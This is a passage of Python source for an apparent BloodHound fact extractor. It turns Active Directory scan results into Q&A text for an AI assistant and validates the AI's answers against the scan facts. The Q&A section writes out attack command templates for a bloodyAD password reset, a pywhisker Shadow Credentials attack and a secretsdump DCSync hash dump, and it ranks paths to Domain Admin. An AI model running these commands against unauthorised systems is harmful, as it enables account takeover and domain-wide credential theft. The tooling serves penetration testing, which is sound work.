                paths_by_target[target].append(path['source'])

            # Add per-target Q&A for top 3 targets (reduced for context window)
            for target, sources in list(paths_by_target.items())[:3]:
                lines.append(f"Q: Can anyone force password reset on {target}?")
                lines.append(f"A: YES - {len(sources)} principal(s) can reset password for {target}:")
                for source in sources[:2]:  # Top 2 sources per target
                    lines.append(f"   - {source}")
                if len(sources) > 2:
                    lines.append(f"   ... and {len(sources) - 2} more")
                lines.append("")

            # CRITICAL FIX: Add exploitation commands with correct syntax
            first_path = facts['forcechangepassword_paths'][0]
            domain = facts['domain_name'] if facts['domain_name'] else 'DOMAIN.LOCAL'
            lines.append(f"Q: How do I reset password for {first_path['target']} using {first_path['source']}?")
            lines.append(f"A: Use bloodyAD.py to reset the password:")
            lines.append(f"   bloodyAD.py -d {domain} -u '{first_path['source']}' -p 'password' set password '{first_path['target']}' 'NewPass123!' --dc-ip <DC_IP>")
            lines.append(f"   NOTE: Replace 'password' with actual password of {first_path['source']}")
            lines.append(f"   SOURCE: bloodyAD.py - Test syntax before use in engagement")
            lines.append("")

        # 14. ADDMEMBER PATHS (FIXED: Per-target Q&A like Nmap)
        if facts['addmember_paths']:
            lines.append("--- ADDMEMBER RIGHTS ---")
            lines.append(f"Q: Which principals can add members to groups?")
            lines.append(f"A: {len(facts['addmember_paths'])} AddMember relationships:")
            for i, path in enumerate(facts['addmember_paths'][:10]):
                lines.append(f"   {i+1}. {path['source']} can add members to {path['target']}")
            if len(facts['addmember_paths']) > 10:
                lines.append(f"   ... and {len(facts['addmember_paths']) - 10} more")
            lines.append("")

            # CRITICAL FIX: Add per-target Q&A (like Nmap does for ports)
            # Group paths by target for specific queries
            paths_by_target = {}
            for path in facts['addmember_paths']:
                target = path['target']
                if target not in paths_by_target:
                    paths_by_target[target] = []
                paths_by_target[target].append(path['source'])

            # Add per-target Q&A for top 3 targets (reduced for context window)
            for target, sources in list(paths_by_target.items())[:3]:
                lines.append(f"Q: Can anyone add members to {target}?")
                lines.append(f"A: YES - {len(sources)} principal(s) can add members to {target}:")
                for source in sources[:2]:  # Top 2 sources per target
                    lines.append(f"   - {source}")
                if len(sources) > 2:
                    lines.append(f"   ... and {len(sources) - 2} more")
                lines.append("")

        # 15. SHADOW CREDENTIALS (FIXED: Per-target Q&A like Nmap)
        if facts['shadow_credentials_paths']:
            lines.append("--- SHADOW CREDENTIALS ATTACK PATHS ---")
            lines.append(f"Q: Which principals can perform Shadow Credentials attacks?")
            lines.append(f"A: CRITICAL - {len(facts['shadow_credentials_paths'])} AddKeyCredentialLink relationships:")
            for i, path in enumerate(facts['shadow_credentials_paths'][:10]):
                lines.append(f"   {i+1}. {path['source']} can add key credential to {path['target']}")
            lines.append("")

            # CRITICAL FIX: Add per-target Q&A (like Nmap does for ports)
            # Group paths by target for specific queries
            paths_by_target = {}
            for path in facts['shadow_credentials_paths']:
                target = path['target']
                if target not in paths_by_target:
                    paths_by_target[target] = []
                paths_by_target[target].append(path['source'])

            # Add per-target Q&A for top 3 targets (reduced for context window)
            for target, sources in list(paths_by_target.items())[:3]:
                lines.append(f"Q: Can anyone perform Shadow Credentials attack on {target}?")
                lines.append(f"A: FACT - YES, {len(sources)} principal(s) have AddKeyCredentialLink permission on {target}:")
                for source in sources[:2]:  # Top 2 sources per target
                    lines.append(f"   - {source} --[AddKeyCredentialLink]--> {target}")
                if len(sources) > 2:
                    lines.append(f"   ... and {len(sources) - 2} more sources")
                lines.append(f"   IMPORTANT: This evidence is specific to {target} - do not apply to other targets")
                lines.append("")

            # CRITICAL FIX: Add exploitation commands with correct syntax
            first_path = facts['shadow_credentials_paths'][0]
            domain = facts['domain_name'] if facts['domain_name'] else 'DOMAIN.LOCAL'
            lines.append(f"Q: How do I perform Shadow Credentials attack from {first_path['source']} to {first_path['target']}?")
            lines.append(f"A: Use pywhisker.py to add key credential:")
            lines.append(f"   pywhisker.py -d {domain} -u '{first_path['source']}' -p 'password' --target '{first_path['target']}' --action add --dc-ip <DC_IP>")
            lines.append(f"   # This will output a certificate that can be used for authentication")
            lines.append(f"   # Then use gettgtpkinit.py to get TGT using the certificate")
            lines.append(f"   SOURCE: pywhisker.py (Shadow Credentials) - Test syntax before use in engagement")
            lines.append("")

        # 16. LAPS READERS
        if facts['laps_readers']:
            lines.append("--- LAPS PASSWORD READERS ---")
            lines.append(f"Q: Which principals can read LAPS passwords?")
            unique_laps = list(set(facts['laps_readers']))
            lines.append(f"A: {len(unique_laps)} principals:")
            lines.append(f"   {', '.join(unique_laps[:10])}")
            lines.append("")

        # 17. ADMINTO PATHS (FIXED: Per-target Q&A like Nmap)
        if facts['adminto_paths']:
            lines.append("--- LOCAL ADMINISTRATOR RIGHTS ---")
            lines.append(f"Q: Which principals have local admin rights on computers?")
            lines.append(f"A: {len(facts['adminto_paths'])} AdminTo relationships:")
            for i, path in enumerate(facts['adminto_paths'][:10]):
                lines.append(f"   {i+1}. {path['source']} is local admin on {path['target']}")
            if len(facts['adminto_paths']) > 10:
                lines.append(f"   ... and {len(facts['adminto_paths']) - 10} more")
            lines.append("")

            # CRITICAL FIX: Add per-target Q&A (like Nmap does for ports)
            # Group paths by target for specific queries
            paths_by_target = {}
            for path in facts['adminto_paths']:
                target = path['target']
                if target not in paths_by_target:
                    paths_by_target[target] = []
                paths_by_target[target].append(path['source'])

            # Add per-target Q&A for top 3 targets (reduced for context window)
            for target, sources in list(paths_by_target.items())[:3]:
                lines.append(f"Q: Who has local admin rights on {target}?")
                lines.append(f"A: YES - {len(sources)} principal(s) have local admin on {target}:")
                for source in sources[:2]:  # Top 2 sources per target
                    lines.append(f"   - {source}")
                if len(sources) > 2:
                    lines.append(f"   ... and {len(sources) - 2} more")
                lines.append("")

        # 18. SESSIONS
        lines.append("--- ACTIVE SESSIONS ---")
        lines.append(f"Q: How many active sessions were captured?")
        lines.append(f"A: {len(facts['sessions'])} sessions")
        lines.append("")

        if facts['da_sessions_on_workstations']:
            lines.append(f"Q: Are there any Domain Admin sessions on workstations?")
            lines.append(f"A: CRITICAL - {len(facts['da_sessions_on_workstations'])} credential theft opportunities:")
            for i, session in enumerate(facts['da_sessions_on_workstations'][:5]):
                lines.append(f"   {i+1}. {session['user']} logged into {session['computer']}")
            lines.append("")

        if facts['sessions']:
            lines.append(f"Q: What are some example active sessions?")
            lines.append(f"A: Sample sessions:")
            for i, session in enumerate(facts['sessions'][:10]):
                lines.append(f"   {i+1}. {session['user']} on {session['computer']}")
            if len(facts['sessions']) > 10:
                lines.append(f"   ... and {len(facts['sessions']) - 10} more sessions")
            lines.append("")

        # 19. CVE VULNERABILITIES (CRITICAL FIX)
        if facts.get('cves'):
            lines.append("--- CVE VULNERABILITIES (FROM DATABASE CORRELATION) ---")
            lines.append(f"Q: Were any CVEs found on Windows hosts?")
            total_cves = sum(len(cves) for cves in facts['cves'].values())
            lines.append(f"A: YES - {total_cves} CVEs found across {len(facts['cves'])} computers")
            lines.append("")

            # Per-computer CVE Q&A (reduced for context window)
            for computer_name, cves in list(facts['cves'].items())[:2]:  # Top 2 computers
                lines.append(f"Q: What CVEs were found on {computer_name}?")
                if cves:
                    lines.append(f"A: {len(cves)} CVEs found:")
                    for cve in cves[:2]:  # Top 2 CVEs per computer
                        lines.append(f"   - {cve['cve_id']} (CVSS {cve['cvss']}, {cve['severity']})")
                        if cve.get('has_exploit') and cve.get('exploits'):
                            lines.append(f"     EXPLOIT AVAILABLE: {len(cve['exploits'])} exploit(s)")
                else:
                    lines.append(f"A: No CVEs found")
                lines.append("")

                # Specific CVE queries for each computer (top 2 only)
                for cve in cves[:2]:
                    cve_id = cve['cve_id']
                    lines.append(f"Q: Can {cve_id} on {computer_name} be exploited remotely?")
                    lines.append(f"A: FACT - {cve_id} details from CVE database:")
                    lines.append(f"   CVSS: {cve['cvss']} ({cve['severity']})")
                    lines.append(f"   Description: {cve.get('description', 'No description available')}")
                    if cve.get('has_exploit') and cve.get('exploits'):
                        exploit_info = cve['exploits'][0]
                        is_remote = exploit_info.get('is_remote', False)
                        if is_remote:
                            lines.append(f"   Public Exploit: YES - Remote exploit in ExploitDB")
                            lines.append(f"   EDB-{exploit_info['edb_id']}: {exploit_info.get('title', 'Unknown')}")
                        else:
                            lines.append(f"   Public Exploit: YES - Local exploit in ExploitDB")
                    else:
                        lines.append(f"   Public Exploit: No exploit found in ExploitDB")
                    lines.append(f"   NOTE: Exploitability depends on patch level, exposure, and configuration - not verified by BloodHound")
                    lines.append("")

            if len(facts['cves']) > 3:
                lines.append(f"... and {len(facts['cves']) - 3} more computers with CVEs")
                lines.append("")
        else:
            lines.append("--- CVE VULNERABILITIES ---")
            lines.append(f"Q: Were any CVEs found on Windows hosts?")
            lines.append(f"A: No CVE data available (requires CVE database)")
            lines.append("")

        # 19. OWNED PRINCIPALS
        if facts['owned_principals']:
            lines.append("--- OWNED/COMPROMISED PRINCIPALS ---")
            lines.append(f"Q: Which principals are marked as owned/compromised?")
            lines.append(f"A: {len(facts['owned_principals'])} owned principals:")
            lines.append(f"   {', '.join(facts['owned_principals'][:15])}")
            lines.append("")

        # 20. CRITICAL FINDINGS SUMMARY
        if facts['critical_findings'] or facts['high_findings']:
            lines.append("--- CRITICAL FINDINGS SUMMARY ---")

            if facts['critical_findings']:
                lines.append(f"Q: What are the CRITICAL security findings?")
                lines.append(f"A: {len(facts['critical_findings'])} critical findings:")
                for i, finding in enumerate(facts['critical_findings'][:10]):
                    lines.append(f"   {i+1}. {finding}")
                if len(facts['critical_findings']) > 10:
                    lines.append(f"   ... and {len(facts['critical_findings']) - 10} more")
                lines.append("")

            if facts['high_findings']:
                lines.append(f"Q: What are the HIGH-risk security findings?")
                lines.append(f"A: {len(facts['high_findings'])} high-risk findings:")
                for i, finding in enumerate(facts['high_findings'][:10]):
                    lines.append(f"   {i+1}. {finding}")
                if len(facts['high_findings']) > 10:
                    lines.append(f"   ... and {len(facts['high_findings']) - 10} more")
                lines.append("")

        # 21. DETAILED ATTACK PATHS (CRITICAL FOR Q&A - reduced for context)
        if facts['attack_paths']:
            lines.append("--- ATTACK PATHS (DETAILED) ---")
            lines.append(f"Q: What attack paths were found in the scan?")
            lines.append(f"A: {len(facts['attack_paths'])} attack paths were identified:")
            lines.append("")

            # List attack paths (top 5 only to save context)
            for i, path in enumerate(facts['attack_paths'][:5], 1):
                source = path.get('source', 'Unknown')
                target = path.get('target', 'Unknown')
                relationship = path.get('relationship', 'Unknown')
                risk = path.get('risk', 'UNKNOWN')

                lines.append(f"   {i}. [{risk}] {source} → {target} ({relationship})")

            if len(facts['attack_paths']) > 5:
                lines.append(f"   ... and {len(facts['attack_paths']) - 5} more attack paths")
            lines.append("")

            # Specific relationship queries
            lines.append(f"Q: Is there an EnrollOnBehalfOf relationship targeting the DC?")
            enrollonbehalf_paths = [p for p in facts['attack_paths']
                                    if 'enrollonbehalfof' in p.get('relationship', '').lower()]
            if enrollonbehalf_paths:
                lines.append(f"A: YES - {len(enrollonbehalf_paths)} EnrollOnBehalfOf relationship(s) found:")
                for path in enrollonbehalf_paths[:5]:
                    lines.append(f"   - {path['source']} → {path['target']} (EnrollOnBehalfOf)")
            else:
                lines.append(f"A: NO - No EnrollOnBehalfOf relationships found in this scan")
            lines.append("")

        # 22. PHASE 2: MULTI-HOP ATTACK PATHS (COMPLEX QUERY SUPPORT)

        # Shortest path to Domain Admin
        lines.append("--- MULTI-HOP ATTACK PATHS ---")
        lines.append(f"Q: What is the shortest path to Domain Admin?")
        if facts.get('shortest_path_to_da'):
            shortest = facts['shortest_path_to_da']
            path_str = " → ".join(shortest['path'])
            methods_str = " → ".join(shortest['methods'])
            lines.append(f"A: FACT - {shortest['length']}-hop path found ({shortest['risk']} risk):")
            lines.append(f"   Evidence chain:")
            # Show each hop with evidence
            for i in range(len(shortest['path']) - 1):
                lines.append(f"   {i+1}. {shortest['path'][i]} --[{shortest['methods'][i]}]--> {shortest['path'][i+1]}")
            # Check if starting principal is a group
            if any(keyword in shortest['source'].lower() for keyword in ['operators', 'admins', 'users', 'group']):
                lines.append(f"   NOTE: {shortest['source']} is a group - you need credentials for ANY member of this group")
            lines.append("")
        else:
            lines.append(f"A: No meaningful privilege escalation path found - principals with Domain Admin access already excluded from analysis")
            lines.append("")

        # All paths to Domain Admins
        if facts.get('paths_to_da'):
            lines.append(f"Q: What are all the attack paths to Domain Admin?")
            lines.append(f"A: {len(facts['paths_to_da'])} paths found to Domain Admin group:")
            for i, path_info in enumerate(facts['paths_to_da'][:2], 1):
                path_str = " → ".join(path_info['path'])
                methods_str = " → ".join(path_info['methods'])
                lines.append(f"   {i}. [{path_info['length']} hops, {path_info['risk']}] {path_info['source']} → {path_info['target']}")
                lines.append(f"      Methods: {methods_str}")
            if len(facts['paths_to_da']) > 2:
                lines.append(f"   ... and {len(facts['paths_to_da']) - 2} more paths")
            lines.append("")

        # Fastest domain compromise
        if facts.get('fastest_domain_compromise'):
            lines.append(f"Q: What is the fastest way to compromise the domain?")
            fastest = facts['fastest_domain_compromise']
            path_str = " → ".join(fastest['path'])
            methods_str = " → ".join(fastest['methods'])
            lines.append(f"A: {fastest['length']}-hop path ({fastest['risk']} risk):")
            lines.append(f"   Path: {path_str}")
            lines.append(f"   Methods: {methods_str}")

            # Add exploitation guidance
            if 'DCSync' in fastest['methods']:
                lines.append(f"   CRITICAL: {fastest['source']} has DCSync rights - can dump all domain hashes")
                domain = facts['domain_name'] if facts['domain_name'] else 'DOMAIN.LOCAL'
                lines.append(f"   Command: secretsdump.py {domain}/{fastest['source']}:password@<DC_IP> -just-dc-ntlm")
            elif fastest['length'] == 1:
                lines.append(f"   Direct exploitation possible from {fastest['source']}")
            else:
                lines.append(f"   Multi-hop exploitation required - follow path methods in sequence")
            lines.append("")

        # Vulnerable Domain Controllers
        if facts.get('vulnerable_dcs'):
            lines.append(f"Q: Which Domain Controllers are vulnerable to attack?")
            lines.append(f"A: {len(facts['vulnerable_dcs'])} DC(s) have exploitable paths (3 hops or less):")
            for dc in facts['vulnerable_dcs'][:2]:
                # Find shortest path to this DC
                dc_paths = [p for p in facts.get('paths_to_dc', []) if p['target'] == dc]
                if dc_paths:
                    shortest_dc_path = min(dc_paths, key=lambda p: p['length'])
                    lines.append(f"   - {dc}: {shortest_dc_path['length']}-hop path from {shortest_dc_path['source']}")
                    lines.append(f"     Methods: {' → '.join(shortest_dc_path['methods'])}")
                else:
                    lines.append(f"   - {dc}")
            lines.append("")
        else:
            lines.append(f"Q: Which Domain Controllers are vulnerable to attack?")
            if facts.get('paths_to_dc'):
                lines.append(f"A: {len(facts.get('paths_to_dc', []))} paths to DCs found, but all require 4+ hops")
            else:
                lines.append(f"A: No attack paths to Domain Controllers found in this scan")
            lines.append("")

        # Paths to KRBTGT
        if facts.get('paths_to_krbtgt'):
            lines.append(f"Q: Are there any attack paths to the KRBTGT account?")
            lines.append(f"A: FACT - {len(facts['paths_to_krbtgt'])} path(s) to KRBTGT found in BloodHound graph (showing top 3):")
            for i, path_info in enumerate(facts['paths_to_krbtgt'][:3], 1):
                path_str = " → ".join(path_info['path'])
                methods_str = " → ".join(path_info['methods'])
                lines.append(f"   {i}. {path_info['source']} --[{methods_str}]--> KRBTGT ({path_info['length']} hops)")
            if len(facts['paths_to_krbtgt']) > 3:
                lines.append(f"   ... and {len(facts['paths_to_krbtgt']) - 3} more paths (query for details)")
            lines.append(f"   WARNING: Compromising KRBTGT enables Golden Ticket attacks")
            lines.append("")

        # 23. ATTACK PATH SUMMARY
        lines.append("--- ATTACK PATH SUMMARY ---")
        lines.append(f"Q: How many attack paths were identified?")
        total_paths = len(facts['attack_paths'])
        critical_paths = len([p for p in facts['attack_paths'] if p['risk'] == 'CRITICAL'])
        high_paths = len([p for p in facts['attack_paths'] if p['risk'] == 'HIGH'])
        medium_paths = len([p for p in facts['attack_paths'] if p['risk'] == 'MEDIUM'])
        lines.append(f"A: {total_paths} total attack paths ({critical_paths} CRITICAL, {high_paths} HIGH, {medium_paths} MEDIUM)")
        lines.append("")

        # Footer
        lines.append("=" * 80)
        lines.append("END OF BLOODHOUND FACTS")
        lines.append("=" * 80)

        return "\n".join(lines)

    def validate_answer(self, answer: str, facts: Dict[str, Any]) -> Dict[str, Any]:
        """
        Anti-hallucination validation layer.
        Checks if AI answer mentions entities that don't exist in the extracted facts.

        Args:
            answer: The AI-generated answer to validate
            facts: The extracted facts to validate against

        Returns:
            Dictionary with validation result: {'valid': bool, 'violations': list, 'reason': str}
        """
        violations = []
        answer_lower = answer.lower()

        # CRITICAL FIX: Remove code blocks from validation (commands contain @ and : which confuse entity detection)
        # Remove content between triple backticks (code blocks)
        answer_without_code = re.sub(r'```[\s\S]*?```', '', answer)

        # Also remove inline code (single backticks)
        answer_without_code = re.sub(r'`[^`]+`', '', answer_without_code)

        # Extract potential usernames from answer (simple pattern matching)
        # Look for common patterns: user@domain, DOMAIN\user, or standalone usernames
        potential_users = re.findall(r'([a-zA-Z0-9_\-\.]+@[a-zA-Z0-9_\-\.]+)', answer_without_code)
        potential_users += re.findall(r'([A-Z]+\\[a-zA-Z0-9_\-\.]+)', answer_without_code)

        # Filter out command-like patterns (contain .py, /, :, [, etc.)
        potential_users = [u for u in potential_users
                          if not any(indicator in u for indicator in ['.py', '.exe', '/', ':', '[', ']', 'http'])]

        # Check if mentioned users exist
        all_users_lower = [u.lower() for u in facts['all_users']]
        all_groups_lower = [g.lower() for g in facts['all_groups']]
        all_computers_lower = [c.lower() for c in facts['all_computers']]

        for user in potential_users:
            # Strip trailing punctuation (e.g., "IT_ADMIN@CORP.LOCAL." -> "IT_ADMIN@CORP.LOCAL")
            user_clean = user.lower().strip().rstrip('.,;:!?')

            # Extract username part (before @) for flexible matching
            username_part = user_clean.split('@')[0] if '@' in user_clean else user_clean.split('\\')[-1]

            # Check in users, groups, AND computers (exact match only to prevent hallucination)
            found_in_users = any(user_clean == existing for existing in all_users_lower)
            found_in_groups = any(user_clean == existing for existing in all_groups_lower)
            found_in_computers = any(user_clean == existing for existing in all_computers_lower)

            # If not found with exact domain, try matching just the username part exactly (handles domain typos/variations)
            if not (found_in_users or found_in_groups or found_in_computers):
                found_in_users = any(username_part == (existing.split('@')[0] if '@' in existing else existing) for existing in all_users_lower)
                found_in_groups = any(username_part == (existing.split('@')[0] if '@' in existing else existing) for existing in all_groups_lower)
                found_in_computers = any(username_part == (existing.split('@')[0] if '@' in existing else existing) for existing in all_computers_lower)

            # Suffix match fallback: handles regex losing prefix of multi-word names
            # e.g., "ADMINS@NORTH..." extracted from "DOMAIN ADMINS@NORTH..." or "KEY ADMINS@NORTH..."
            if not (found_in_users or found_in_groups or found_in_computers):
                found_in_users = any(existing.endswith(user_clean) for existing in all_users_lower)
                found_in_groups = any(existing.endswith(user_clean) for existing in all_groups_lower)
                found_in_computers = any(existing.endswith(user_clean) for existing in all_computers_lower)

            if not (found_in_users or found_in_groups or found_in_computers):
                violations.append(f"Entity '{user}' mentioned but not found in scan data")

        # Extract potential group names (case-insensitive common patterns)
        # Only match when mentioned as specific groups, not in generic context
        potential_groups = re.findall(r'(domain admins|enterprise admins|backup operators|account operators|helpdesk)', answer_lower)

        for group in potential_groups:
            group_clean = group.lower().strip()

            # Check if group exists at all (even if no members)
            group_exists = any(group_clean in existing for existing in all_groups_lower)

            # ONLY block if group doesn't exist at all
            # Don't block just because group has no members - that's valid information!
            if not group_exists:
                # Check if this is a general knowledge explanation (not claiming group exists)
                context_words = ['would', 'should', 'could', 'typically', 'generally', 'usually', 'in active directory',
                                 'concept', 'local', 'membership of', 'member of', 'is an edge', 'indicates']
                is_general_knowledge = any(word in answer_lower for word in context_words)

                # Also skip if it's talking about "local administrators" or "administrators security principal"
                if 'local' in answer_lower or 'security principal' in answer_lower or 'edge' in answer_lower:
                    is_general_knowledge = True

                if not is_general_knowledge:
                    violations.append(f"Group '{group}' mentioned but doesn't exist in scan data")

        # Check if answer FALSELY claims vulnerability exists when it doesn't
        # ONLY block if claiming "YES, found X" when list is empty
        # Allow explaining what something is (general knowledge)

        # Kerberoasting check - only block if claiming accounts exist when none found
        if not facts['kerberoastable']:
            # Pattern: "Yes, X is Kerberoastable" or "Found Kerberoastable accounts"
            false_kerb_claim = re.search(r'(yes.*kerberoast|found.*kerberoast.*account|[0-9]+.*kerberoast)', answer_lower)
            if false_kerb_claim:
                # Make sure it's not saying "No" or "None"
                if not any(neg in answer_lower for neg in ['no kerberoast', 'none', 'not found', 'not present', 'no users']):
                    violations.append("Answer claims Kerberoastable accounts exist, but none found in scan")

        # AS-REP Roasting check
        if not facts['asrep_roastable']:
            false_asrep_claim = re.search(r'(yes.*as-rep|found.*as-rep.*account|[0-9]+.*as-rep)', answer_lower)
            if false_asrep_claim:
                if not any(neg in answer_lower for neg in ['no as-rep', 'none', 'not found', 'not present']):
                    violations.append("Answer claims AS-REP roastable accounts exist, but none found in scan")

        # DCSync check
        if not facts['dcsync_principals']:
            false_dcsync_claim = re.search(r'(yes.*dcsync|has dcsync|found.*dcsync|can.*replicate)', answer_lower)
            if false_dcsync_claim:
                if not any(neg in answer_lower for neg in ['no dcsync', 'none', 'not found', 'not present', 'no explicit']):
                    violations.append("Answer claims DCSync rights exist, but none found in scan")

        # Validate result
        if violations:
            return {
                'valid': False,
                'violations': violations,
                'reason': '; '.join(violations)
            }
        else:
            return {
                'valid': True,
                'violations': [],
                'reason': 'Answer validated against extracted facts'
            }


# Convenience functions for easy integration (matching Nmap structure)
def extract_facts(json_data: Dict[str, Any]) -> Dict[str, Any]:
    """
    Convenience function to extract facts from BloodHound JSON.

    Args:
        json_data: Parsed BloodHound JSON dictionary

    Returns:
        Dictionary of extracted facts
    """
    extractor = BloodHoundFactExtractor()
    return extractor.extract_facts(json_data)


def facts_to_text(facts: Dict[str, Any]) -> str:
    """
    Convenience function to convert facts to Q&A text format.

    Args:
        facts: Dictionary of extracted facts

    Returns:
        Q&A formatted string
    """
    extractor = BloodHoundFactExtractor()
    return extractor.facts_to_text(facts)


def validate_answer(answer: str, facts: Dict[str, Any]) -> Dict[str, Any]:
    """
    Convenience function to validate an answer against facts.

    Args:
        answer: AI-generated answer
        facts: Extracted facts

    Returns:
        Validation result dictionary
    """
    extractor = BloodHoundFactExtractor()
    return extractor.validate_answer(answer, facts)
